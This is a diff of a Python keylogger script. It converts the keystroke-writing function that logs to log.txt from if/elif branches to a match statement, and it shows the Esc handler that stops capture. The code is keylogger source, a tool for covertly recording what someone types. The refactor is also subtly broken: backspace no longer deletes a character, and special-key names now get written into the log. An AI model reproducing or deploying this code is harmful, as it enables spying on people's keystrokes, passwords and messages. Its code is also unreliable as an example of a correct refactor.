@@ -26,24 +26,24 @@ def write_file(keys):                   # Writes keystrokes to file.
     with open("log.txt", "a") as f: 
         for key in keys:
             k = str(key).replace("'","")
-            if k == "Key.space":
-                f.write(' ')
-            elif k == "Key.shift":
-                f.write("")
-            elif k == "Key.backspace":
-                f.seek(0,2)             # End of file.
-                size=f.tell()           # The size of the file.
-                f.truncate(size-1)      # Reduce the size of the file by one
-            elif k == "Key.enter":      
-                f.write("\n")
-            elif k == "Key.tab":
-                f.write("\t") 
-            elif k == "Key.esc":
-                f.write("\n-----\n ~// END Of Session //~")
-            elif k.find("Key") == -1:   # Record basic keystroke
-                f.write(k)
+            match k:
+                case "Key.space":
+                    f.write(' ')
+                case "Key.shift":
+                    f.write("")
+                case "Key.backspace":
+                    f.seek(0,2)
+                case "Key.enter":
+                    f.write("\n")
+                case "Key.tab":
+                    f.write("\t") 
+                case "Key.esc":
+                    f.write("\n-----\n ~// END Of Session //~")
+                case _:
+                    f.write(k)
+                    
 
-def on_release(key):                    # Exit keylogger.
+def on_release(key):                   
     if key == Key.esc:
         return False
 
